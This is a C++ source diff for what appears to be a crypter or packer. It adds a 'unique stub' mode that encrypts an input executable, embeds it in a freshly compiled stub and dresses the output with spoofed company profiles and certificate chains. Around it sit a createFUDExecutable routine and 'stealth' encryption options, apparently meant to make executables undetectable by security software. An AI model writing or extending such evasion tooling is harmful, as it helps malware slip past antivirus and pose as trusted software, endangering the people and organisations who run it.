@@ -41,6 +41,7 @@
 #include "enhanced_loader_utils.h"
 #include "enhanced_encryption_system.h"
 #include "ultimate_encryption_integration.h"
+#include "uniquestub.h"
 
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "crypt32.lib")
@@ -102,7 +103,8 @@ enum EncryptionType {
     ENCRYPT_TRIPLE = 4,         // Triple encryption (XOR -> AES -> ChaCha20)
     ENCRYPT_STEALTH_TRIPLE = 5, // Stealth triple encryption (random order)
     ENCRYPT_BIG_DECIMAL = 6,    // Big decimal string conversion
-    ENCRYPT_ULTIMATE = 7        // Ultimate encryption (all methods combined)
+    ENCRYPT_ULTIMATE = 7,       // Ultimate encryption (all methods combined)
+    ENCRYPT_UNIQUE_STUB = 8     // Unique stub with embedded payload
 };
 
 // Function to kill running instances before build
@@ -1555,6 +1557,7 @@ public:
     EmbeddedCompiler embeddedCompiler;
     UltimateEncryptionIntegration ultimateEncryption;
     EnhancedEncryptionSystem enhancedEncryption;
+    UniqueStubGenerator uniqueStubGenerator;
 
     struct CompanyProfile {
         std::string name;
@@ -2630,6 +2633,55 @@ public:
     }
 
     // NEW: Create multi-layer encrypted executable
+    bool createUniqueStubExecutable(const std::string& inputPath, const std::string& outputPath,
+                                   int companyIndex, int certIndex,
+                                   MultiArchitectureSupport::Architecture architecture) {
+        try {
+            std::ifstream inputFile(inputPath, std::ios::binary);
+            if (!inputFile.is_open()) {
+                return false;
+            }
+
+            inputFile.seekg(0, std::ios::end);
+            size_t inputSize = inputFile.tellg();
+            inputFile.seekg(0, std::ios::beg);
+
+            std::vector<uint8_t> originalPEData(inputSize);
+            inputFile.read(reinterpret_cast<char*>(originalPEData.data()), inputSize);
+            inputFile.close();
+
+            // Generate unique key for encryption
+            std::string uniqueKey = uniqueStubGenerator.generateUniqueKey();
+            
+            // Generate unique stub with embedded payload
+            std::string uniqueStub = uniqueStubGenerator.generateUniqueStub(originalPEData, uniqueKey);
+            
+            // Save stub to temporary file
+            std::string tempStubFile = "temp_unique_stub_" + std::to_string(GetTickCount()) + ".cpp";
+            if (!UniqueStubUtils::saveStubToFile(uniqueStub, tempStubFile)) {
+                return false;
+            }
+
+            // Compile the unique stub
+            bool compileSuccess = UniqueStubUtils::compileStub(tempStubFile, outputPath);
+            
+            // Clean up temporary file
+            std::remove(tempStubFile.c_str());
+            
+            if (compileSuccess) {
+                // Enhance the executable with company and certificate info
+                enhanceExecutableLegitimacy(outputPath, companyProfiles[companyIndex], 
+                                          certificateChains[certIndex], architecture);
+                return true;
+            }
+            
+            return false;
+        }
+        catch (...) {
+            return false;
+        }
+    }
+
     bool createMultiLayerEncryptedExecutable(const std::string& inputPath, const std::string& outputPath,
                                             const std::vector<EncryptionType>& encryptionLayers,
                                             int companyIndex, int certIndex,
@@ -3224,8 +3276,14 @@ static void createFUDExecutable() {
     
     // Check if encryption is selected
     if (encryptionType != ENCRYPT_NONE) {
-        SetWindowTextW(g_hStatusText, L"Creating encrypted executable with advanced encryption...");
-        success = g_packer.createEncryptedExecutable(inputPath, outputPath, encryptionType, companyIndex, certIndex, architecture);
+        // Handle unique stub encryption
+        if (encryptionType == ENCRYPT_UNIQUE_STUB) {
+            SetWindowTextW(g_hStatusText, L"Creating unique stub executable with embedded payload...");
+            success = g_packer.createUniqueStubExecutable(inputPath, outputPath, companyIndex, certIndex, architecture);
+        } else {
+            SetWindowTextW(g_hStatusText, L"Creating encrypted executable with advanced encryption...");
+            success = g_packer.createEncryptedExecutable(inputPath, outputPath, encryptionType, companyIndex, certIndex, architecture);
+        }
     }
     else if (fileSize > 2 * 1024 * 1024) { // If > 2MB, use stub method
         SetWindowTextW(g_hStatusText, L"Large file detected, using optimized stub method...");
@@ -3367,7 +3425,8 @@ static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM l
             L"Triple Encryption",
             L"Stealth Triple",
             L"Big Decimal",
-            L"Ultimate Encryption"
+            L"Ultimate Encryption",
+            L"Unique Stub"
         };
         
         for (const auto& method : encryptionMethods) {
